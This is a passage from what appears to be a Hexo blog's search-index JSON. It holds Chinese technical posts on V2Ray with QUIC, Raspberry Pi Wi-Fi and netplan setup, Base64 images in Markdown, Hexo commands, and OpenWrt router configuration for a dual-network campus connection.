5.3.0-1014-raspi2 <span class=\"comment\">#16-Ubuntu SMP Tue Nov 26 11:18:23 UTC 2019 aarch64 aarch64 aarch64 GNU/Linux</span></span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":["树莓派"]},{"title":"V2ray使用QUIC","url":"https://littleghost2016.github.io/2019/09/24/V2ray使用QUIC/","content":"<h1 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h1><p>服务端配置<code>config.json</code></p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"log\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"access\"</span>: <span class=\"string\">\"/var/log/v2ray/access.log\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"error\"</span>: <span class=\"string\">\"/var/log/v2ray/error.log\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"loglevel\"</span>: <span class=\"string\">\"warning\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"inbound\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"port\"</span>: <span class=\"number\">11942</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"vmess\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"settings\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"clients\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"attr\">\"id\"</span>: <span class=\"string\">\"********-****-****-****-************\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">\"alterId\"</span>: <span class=\"number\">64</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"attr\">\"streamSettings\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"network\"</span>: <span class=\"string\">\"quic\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"security\"</span>: <span class=\"string\">\"tls\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"quicSettings\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"security\"</span>: <span class=\"string\">\"aes-128-gcm\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"header\"</span>: &#123;</span><br><span class=\"line\">          <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"srtp\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">\"key\"</span>: <span class=\"string\">\"0\"</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"attr\">\"tlsSettings\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"serverName\"</span>: <span class=\"string\">\"quic.littleghost.cn\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"alpn\"</span>: [</span><br><span class=\"line\">          <span class=\"string\">\"http/1.1\"</span></span><br><span class=\"line\">        ],</span><br><span class=\"line\">        <span class=\"attr\">\"certificates\"</span>: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"attr\">\"certificateFile\"</span>: <span class=\"string\">\"/etc/nginx/certificate/1_quic.littleghost.cn_bundle.crt\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"keyFile\"</span>: <span class=\"string\">\"/etc/nginx/certificate/2_quic.littleghost.cn.key\"</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"outbound\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"freedom\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"settings\"</span>: &#123;&#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"outboundDetour\"</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"blackhole\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"settings\"</span>: &#123;&#125;,</span><br><span class=\"line\">      <span class=\"attr\">\"tag\"</span>: <span class=\"string\">\"blocked\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"routing\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"strategy\"</span>: <span class=\"string\">\"rules\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"settings\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"rules\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"field\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">\"ip\"</span>: [</span><br><span class=\"line\">            <span class=\"string\">\"0.0.0.0/8\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"10.0.0.0/8\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"100.64.0.0/10\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"127.0.0.0/8\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"169.254.0.0/16\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"172.16.0.0/12\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"192.0.0.0/24\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"192.0.2.0/24\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"192.168.0.0/16\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"198.18.0.0/15\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"198.51.100.0/24\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"203.0.113.0/24\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"::1/128\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"fc00::/7\"</span>,</span><br><span class=\"line\">            <span class=\"string\">\"fe80::/10\"</span></span><br><span class=\"line\">          ],</span><br><span class=\"line\">          <span class=\"attr\">\"outboundTag\"</span>: <span class=\"string\">\"blocked\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>客户端配置<code>quicConfig.json</code></p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"log\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"access\"</span>: <span class=\"string\">\"D:\\\\Programs\\\\V2Ray\\\\v2rayN-Core\\\\log\\\\access.log\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"error\"</span>: <span class=\"string\">\"D:\\\\Programs\\\\V2Ray\\\\v2rayN-Core\\\\log\\\\error.log\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"loglevel\"</span>: <span class=\"string\">\"warning\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"inbounds\"</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"port\"</span>: <span class=\"number\">1080</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"socks\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"sniffing\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"enabled\"</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"destOverride\"</span>: [</span><br><span class=\"line\">          <span class=\"string\">\"http\"</span>,</span><br><span class=\"line\">          <span class=\"string\">\"tls\"</span></span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"attr\">\"settings\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"auth\"</span>: <span class=\"literal\">null</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"outbounds\"</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"attr\">\"protocol\"</span>: <span class=\"string\">\"vmess\"</span>,</span><br><span class=\"line\">      <span class=\"attr\">\"settings\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"vnext\"</span>: [</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"attr\">\"address\"</span>: <span class=\"string\">\"quic.littleghost.cn\"</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"port\"</span>: <span class=\"number\">11942</span>,</span><br><span class=\"line\">            <span class=\"attr\">\"users\"</span>: [</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"id\"</span>: <span class=\"string\">\"********-****-****-****-************\"</span>,</span><br><span class=\"line\">                <span class=\"attr\">\"alterId\"</span>: <span class=\"number\">64</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            ]</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"attr\">\"streamSettings\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"network\"</span>: <span class=\"string\">\"quic\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"security\"</span>: <span class=\"string\">\"tls\"</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"tlsSettings\"</span>: &#123;</span><br><span class=\"line\">          <span class=\"attr\">\"serverName\"</span>: <span class=\"string\">\"quic.littleghost.cn\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">\"quicSettings\"</span>: &#123;</span><br><span class=\"line\">          <span class=\"attr\">\"security\"</span>: <span class=\"string\">\"aes-128-gcm\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">\"key\"</span>: <span class=\"string\">\"0\"</span>,</span><br><span class=\"line\">          <span class=\"attr\">\"header\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"attr\">\"type\"</span>: <span class=\"string\">\"srtp\"</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"最后想说的\"><a href=\"#最后想说的\" class=\"headerlink\" title=\"最后想说的\"></a>最后想说的</h1><ol>\n<li>刚开始服务端使用<code>Nginx</code>挂反向代理，不行，后来客户端直接连接端口，不经过<code>Nginx</code>。</li>\n<li>客户端软件<code>V2rayN</code>好像对<code>QUIC</code>的支持额…（也可能是我自己不会使用），对于出现<code>[missing port in address]</code>的问题，在客户端配置文件中加入以下配置语句。</li>\n</ol>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">\"tlsSettings\": &#123;</span><br><span class=\"line\">\t\"serverName\": \"quic.littleghost.cn\"</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p><a href=\"https://github.com/v2ray/v2ray-core/issues/1536\" target=\"_blank\" rel=\"noopener\">Github Issues - Quic协议无法连接 #1536</a></p>\n</blockquote>\n<ol start=\"3\">\n<li>服务端不挂<code>Nginx</code>，客户端直接使用<code>v2ray -config XXX</code>的情况下，<code>QUIC</code>可以使用，但是速度极慢（访问404网站、非死不可一直不行，游兔箔可以访问但速度不佳，目测不如蜗牛爬行..）而且大概率连接失败，猜测运营商并不喜欢UDP :(</li>\n<li><del>个人目前使用的是<code>Nginx + WebSocket + TLS + CDN</code>，下一步准备尝试<code>Caddy + H2 + TLS + CDN</code>，看看效果如何，现在发烧有点难受…..</del>还有其他人需要使用现有配置，就先不动了…</li>\n</ol>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://github.com/v2ray/v2ray-core/issues/1446\" target=\"_blank\" rel=\"noopener\">QUIC使用 aes-128-gcm 连接关闭 #1446</a></p>\n<p><a href=\"https://github.com/v2ray/v2ray-core/issues/1440\" target=\"_blank\" rel=\"noopener\">QUIC 无法连接 #1440</a></p>\n<p><a href=\"https://luke6887.me/?p=623\" target=\"_blank\" rel=\"noopener\">可能的v2ray的quic中继。。。</a></p>\n","categories":["技术"],"tags":["v2ray","quic"]},{"title":"写代码怎能不会这些Linux命令?","url":"https://littleghost2016.github.io/2019/08/22/写代码怎能不会这些Linux命令/","content":"<blockquote>\n<p>图片来自<a href=\"https://zhuanlan.zhihu.com/p/28674639\" target=\"_blank\" rel=\"noopener\">_王爵的技术小黑屋</a></p>\n</blockquote>\n<p><img src=\"%E5%86%99%E4%BB%A3%E7%A0%81%E6%80%8E%E8%83%BD%E4%B8%8D%E4%BC%9A%E8%BF%99%E4%BA%9BLinux%E5%91%BD%E4%BB%A4.jpg\" alt=\"写代码怎能不会这些Linux命令\"></p>\n","categories":[],"tags":["linux"]},{"title":"CPU、显卡天梯图","url":"https://littleghost2016.github.io/2019/07/31/CPU、显卡天梯图/","content":"<h1 id=\"CPU天梯图\"><a href=\"#CPU天梯图\" class=\"headerlink\" title=\"CPU天梯图\"></a>CPU天梯图</h1><p><img src=\"CPU%E5%A4%A9%E6%A2%AF%E5%9B%BE.jpg\" alt=\"CPU天梯图\"></p>\n<h1 id=\"移动端笔记本电脑显卡天梯图\"><a href=\"#移动端笔记本电脑显卡天梯图\" class=\"headerlink\" title=\"移动端笔记本电脑显卡天梯图\"></a>移动端笔记本电脑显卡天梯图</h1><p><img src=\"%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%94%B5%E8%84%91%E6%98%BE%E5%8D%A1%E5%A4%A9%E6%A2%AF%E5%9B%BE.jpg\" alt=\"移动端笔记本电脑显卡天梯图\"></p>\n<h1 id=\"桌面级台式电脑显卡天梯图\"><a href=\"#桌面级台式电脑显卡天梯图\" class=\"headerlink\" title=\"桌面级台式电脑显卡天梯图\"></a>桌面级台式电脑显卡天梯图</h1><p><img src=\"%E6%A1%8C%E9%9D%A2%E7%BA%A7%E5%8F%B0%E5%BC%8F%E7%94%B5%E8%84%91%E6%98%BE%E5%8D%A1%E5%A4%A9%E6%A2%AF%E5%9B%BE.jpg\" alt=\"桌面级台式电脑显卡天梯图\"></p>\n","categories":["电脑"],"tags":["cpu","显卡"]},{"title":"树莓派使用无线连接网络","url":"https://littleghost2016.github.io/2019/07/15/树莓派使用无线连接网络/","content":"<h1 id=\"不使用netplan\"><a href=\"#不使用netplan\" class=\"headerlink\" title=\"不使用netplan\"></a>不使用netplan</h1><h2 id=\"1-安装工具\"><a href=\"#1-安装工具\" class=\"headerlink\" title=\"1. 安装工具\"></a>1. 安装工具</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo apt install ifupdown</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-修改-etc-network-interfaces文件\"><a href=\"#2-修改-etc-network-interfaces文件\" class=\"headerlink\" title=\"2. 修改/etc/network/interfaces文件\"></a>2. 修改<code>/etc/network/interfaces</code>文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ifupdown has been replaced by netplan(5) on this system.  See</span><br><span class=\"line\"># /etc/netplan for current configuration.</span><br><span class=\"line\"># To re-enable ifupdown on this system, you can run:</span><br><span class=\"line\">#    sudo apt install ifupdown</span><br><span class=\"line\"></span><br><span class=\"line\">auto wlan0</span><br><span class=\"line\">allow-hotplug wlan0</span><br><span class=\"line\">#iface wlan0 inet static</span><br><span class=\"line\">iface wlan0 inet dhcp</span><br><span class=\"line\">#       address 192.168.1.52</span><br><span class=\"line\">#       netmask 255.255.255.0</span><br><span class=\"line\">        wpa_conf /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-修改-etc-wpa-supplicant-wpa-supplicant-conf文件\"><a href=\"#3-修改-etc-wpa-supplicant-wpa-supplicant-conf文件\" class=\"headerlink\" title=\"3. 修改/etc/wpa_supplicant/wpa_supplicant.conf文件\"></a>3. 修改<code>/etc/wpa_supplicant/wpa_supplicant.conf</code>文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo vim /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ctrl_interface=/var/run/wpa_supplicant</span><br><span class=\"line\">#ap_scan=1</span><br><span class=\"line\"></span><br><span class=\"line\">network=&#123;</span><br><span class=\"line\">       ssid=&quot;SSID&quot;</span><br><span class=\"line\">       scan_ssid=1</span><br><span class=\"line\">       psk=&quot;password&quot;</span><br><span class=\"line\">       priority=5</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-重启网卡\"><a href=\"#4-重启网卡\" class=\"headerlink\" title=\"4. 重启网卡\"></a>4. 重启网卡</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo ifdown wlan0</span><br></pre></td></tr></table></figure>\n\n<p>回显：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Killed old client process</span><br><span class=\"line\">Internet Systems Consortium DHCP Client 4.3.5</span><br><span class=\"line\">Copyright 2004-2016 Internet Systems Consortium.</span><br><span class=\"line\">All rights reserved.</span><br><span class=\"line\">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class=\"line\"></span><br><span class=\"line\">Listening on LPF/wlan0/b8:27:eb:xx:xx:xx</span><br><span class=\"line\">Sending on   LPF/wlan0/b8:27:eb:xx:xx:xx</span><br><span class=\"line\">Sending on   Socket/fallback</span><br><span class=\"line\">DHCPRELEASE on wlan0 to 192.168.1.1 port 67 (xid=0x13ea153a)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo ifup wlan0</span><br></pre></td></tr></table></figure>\n\n<p>回显：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Internet Systems Consortium DHCP Client 4.3.5</span><br><span class=\"line\">Copyright 2004-2016 Internet Systems Consortium.</span><br><span class=\"line\">All rights reserved.</span><br><span class=\"line\">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class=\"line\"></span><br><span class=\"line\">Listening on LPF/wlan0/b8:27:eb:xx:xx:xx</span><br><span class=\"line\">Sending on   LPF/wlan0/b8:27:eb:xx:xx:xx</span><br><span class=\"line\">Sending on   Socket/fallback</span><br><span class=\"line\">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 3 (xid=0xd0fcdd63)</span><br><span class=\"line\">DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 4 (xid=0xd0fcdd63)</span><br><span class=\"line\">DHCPREQUEST of 192.168.1.52 on wlan0 to 255.255.255.255 port 67 (xid=0x63ddfcd0)</span><br><span class=\"line\">DHCPOFFER of 192.168.1.52 from 192.168.1.1</span><br><span class=\"line\">DHCPACK of 192.168.1.52 from 192.168.1.1</span><br><span class=\"line\">bound to 192.168.1.52 -- renewal in 2147483648 seconds.</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-备注\"><a href=\"#5-备注\" class=\"headerlink\" title=\"5. 备注\"></a>5. 备注</h2><ul>\n<li>ap_scan<ul>\n<li>默认值为1</li>\n<li>1：总是先连接可见的WiFi，如果扫描完所有可见的网络之后都没有连接上，则开始连接隐藏WiFi。</li>\n<li>2：会按照network定义的顺序连接WiFi网络，遇到隐藏的将立刻开始连接，因此在这个模式下连接顺序不受priority影响</li>\n</ul>\n</li>\n<li>ctrl_interface<ul>\n<li>文件夹里面存的是一个当前使用的interface的socket文件，可以供其他程序使用读取WiFi状态信息</li>\n</ul>\n</li>\n<li>network<ul>\n<li>是一个连接一个WiFi网络的配置，可以有多个，wpa_supplicant会按照priority指定的优先级（数字越大越先连接）来连接，当然，在这个列表里面隐藏WiFi不受priority的影响，隐藏WiFi总是在可见WiFi不能连接时才开始连接。</li>\n<li>ssid：网络的ssid</li>\n<li>psk：密码</li>\n<li>priority：连接优先级，越大越优先</li>\n<li>scan_ssid：连接隐藏WiFi时需要指定该值为1</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"使用netplan\"><a href=\"#使用netplan\" class=\"headerlink\" title=\"使用netplan\"></a>使用netplan</h1><p>Ubuntu 18及以后的新系统使用netplan管理网络连接，不再使用interfaces。</p>\n<h2 id=\"修改配置文件\"><a href=\"#修改配置文件\" class=\"headerlink\" title=\"修改配置文件\"></a>修改配置文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim /etc/netplan/50-cloud-init.yaml</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\"><span class=\"attr\">    ethernets:</span></span><br><span class=\"line\"><span class=\"attr\">        eth0:</span></span><br><span class=\"line\"><span class=\"attr\">            dhcp4:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">            optional:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">    wifis:</span></span><br><span class=\"line\"><span class=\"attr\">            wlan0:</span></span><br><span class=\"line\"><span class=\"attr\">                    dhcp4:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">                    dhcp6:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"attr\">                    access-points:</span></span><br><span class=\"line\">                            <span class=\"string\">\"WiFi名称\"</span><span class=\"string\">:</span></span><br><span class=\"line\"><span class=\"attr\">                                    password:</span> <span class=\"string\">\"密码\"</span></span><br><span class=\"line\"><span class=\"attr\">    version:</span> <span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"应用更改\"><a href=\"#应用更改\" class=\"headerlink\" title=\"应用更改\"></a>应用更改</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo netplan apply</span><br></pre></td></tr></table></figure>\n\n","categories":["树莓派"],"tags":["树莓派"]},{"title":"Markdown中使用Base64格式保存图片","url":"https://littleghost2016.github.io/2019/07/14/Markdown中使用Base64格式保存图片/","content":"<h1 id=\"压缩图片的网页\"><a href=\"#压缩图片的网页\" class=\"headerlink\" title=\"压缩图片的网页\"></a>压缩图片的网页</h1><p><a href=\"http://www.bejson.com/ui/compress_img/\" target=\"_blank\" rel=\"noopener\">http://www.bejson.com/ui/compress_img/</a></p>\n<h1 id=\"图片转Base64的网页\"><a href=\"#图片转Base64的网页\" class=\"headerlink\" title=\"图片转Base64的网页\"></a>图片转Base64的网页</h1><p><a href=\"http://imgbase64.duoshitong.com/\" target=\"_blank\" rel=\"noopener\">http://imgbase64.duoshitong.com/</a></p>\n<h1 id=\"Markdown中的使用格式\"><a href=\"#Markdown中的使用格式\" class=\"headerlink\" title=\"Markdown中的使用格式\"></a>Markdown中的使用格式</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">其他内容</span><br><span class=\"line\"></span><br><span class=\"line\">![image][linkid1]</span><br><span class=\"line\"></span><br><span class=\"line\">其他内容</span><br><span class=\"line\"></span><br><span class=\"line\">[linkid1]: data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDACg...</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"例：\"><a href=\"#例：\" class=\"headerlink\" title=\"例：\"></a>例：</h1><p><img src=\"%E7%A4%BA%E4%BE%8B.jpg\" alt=\"示例\"></p>\n","categories":["技术"],"tags":["markdown","base64"]},{"title":"hexo的使用","url":"https://littleghost2016.github.io/2019/07/13/hexo的使用/","content":"<h1 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"安装Hexo\"></a>安装Hexo</h1><h2 id=\"初始化文件夹\"><a href=\"#初始化文件夹\" class=\"headerlink\" title=\"初始化文件夹\"></a>初始化文件夹</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo init myblog</span><br><span class=\"line\"></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> myblog</span><br><span class=\"line\">$ npm install</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装主题\"><a href=\"#安装主题\" class=\"headerlink\" title=\"安装主题\"></a>安装主题</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> git@github.com:forsigner/fexo.git themes/fexo</span><br><span class=\"line\"></span><br><span class=\"line\">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"常用hexo命令\"><a href=\"#常用hexo命令\" class=\"headerlink\" title=\"常用hexo命令\"></a>常用hexo命令</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br><span class=\"line\">$ hexo s</span><br><span class=\"line\">$ hexo d</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"迁移hexo需要移动的文件（夹）\"><a href=\"#迁移hexo需要移动的文件（夹）\" class=\"headerlink\" title=\"迁移hexo需要移动的文件（夹）\"></a>迁移<code>hexo</code>需要移动的文件（夹）</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">_config.yml</span><br><span class=\"line\">package.json</span><br><span class=\"line\">scaffolds/</span><br><span class=\"line\">source/</span><br><span class=\"line\">themes/</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ npm install hexo-cli -g</span><br><span class=\"line\">$ npm install</span><br><span class=\"line\">$ npm install hexo-deployer-git --save  // 文章部署到 git 的模块</span><br></pre></td></tr></table></figure>\n\n","categories":["技术"],"tags":["hexo"]},{"title":"K2P同时校园网和翼讯","url":"https://littleghost2016.github.io/2019/07/11/K2P同时校园网和翼讯/","content":"<blockquote>\n<p><a href=\"http://rs.xidian.edu.cn/forum.php?mod=viewthread&tid=906698&highlight=ipv6\" target=\"_blank\" rel=\"noopener\">文章</a>原创为西电睿思的小忧伤，感谢大佬提供技术和文章授权！</p>\n<p>最后可以实现连入路由器的电脑端（或手机端）不需要任何配置即可使用ipv6，且不限制流量的使用ipv4。</p>\n</blockquote>\n<h1 id=\"1-设置校园网的账号密码\"><a href=\"#1-设置校园网的账号密码\" class=\"headerlink\" title=\"1.设置校园网的账号密码\"></a>1.设置校园网的账号密码</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ uci <span class=\"built_in\">set</span> network.wan.proto=pppoe</span><br><span class=\"line\">$ uci <span class=\"built_in\">set</span> network.wan.username=学号</span><br><span class=\"line\">$ uci <span class=\"built_in\">set</span> network.wan.password=校园网密码</span><br><span class=\"line\">$ uci commit</span><br><span class=\"line\">$ /etc/init.d/network restart</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"2-更新软件源\"><a href=\"#2-更新软件源\" class=\"headerlink\" title=\"2.更新软件源\"></a>2.更新软件源</h1><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ opkg update &amp;&amp; opkg install kmod-ipt-nat6 &amp;&amp; opkg install kmod-macvlan &amp;&amp; opkg install iputils-tracepath6</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"3-连接虚拟链路\"><a href=\"#3-连接虚拟链路\" class=\"headerlink\" title=\"3.连接虚拟链路\"></a>3.连接虚拟链路</h1><p><code>eth1</code>就是连接外网的那根线，也就是wan口，后面出现的<code>eth1</code>同理换成自己的即可<br><em>不一样就换成自己的，到web页面<code>network-interface</code>里随便找一个点击edit，Physical Settings，就能看到wan口是什么</em></p>\n<p>然后执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ip link add link eth1 name veth1 <span class=\"built_in\">type</span> macvlan</span><br><span class=\"line\">$ ifconfig veth1 up</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"4-添加虚拟链路开机启动\"><a href=\"#4-添加虚拟链路开机启动\" class=\"headerlink\" title=\"4.添加虚拟链路开机启动\"></a>4.添加虚拟链路开机启动</h1><p><em>注意：这不是命令，需要添加到文件里</em></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ vim /etc/rc.local</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 在最后一行exit 0之前添加以下内容</span></span><br><span class=\"line\">sleep 20</span><br><span class=\"line\">ip link add link eth1 name veth1 <span class=\"built_in\">type</span> macvlan</span><br><span class=\"line\">ifconfig veth1 up</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"5-添加一个新的wan口\"><a href=\"#5-添加一个新的wan口\" class=\"headerlink\" title=\"5.添加一个新的wan口\"></a>5.添加一个新的wan口</h1><p>可以在用户界面<code>Network-&gt;Interfaces&gt;Add new interface</code>添加新wan口，名字设置为<code>vwan1</code>，Protocol设置为<code>pppoe</code>，<code>interface</code>选择<code>veth1</code></p>\n<h1 id=\"6-在luci界面设置vwan1\"><a 